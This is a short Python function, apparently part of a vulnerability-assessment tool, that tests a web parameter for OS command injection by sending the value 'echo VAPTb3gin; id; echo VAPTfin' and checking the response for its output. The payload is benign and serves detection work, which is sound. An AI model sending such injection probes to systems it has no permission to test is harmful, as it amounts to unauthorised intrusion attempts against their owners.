import requests


def confirm_execution(target, parameter):
    payload = 'echo VAPTb3gin; id; echo VAPTfin'
    response = requests.get(target, params={parameter: payload}, timeout=10)
    return 'VAPTb3gin' in response.text and 'uid=' in response.text and 'VAPTfin' in response.text
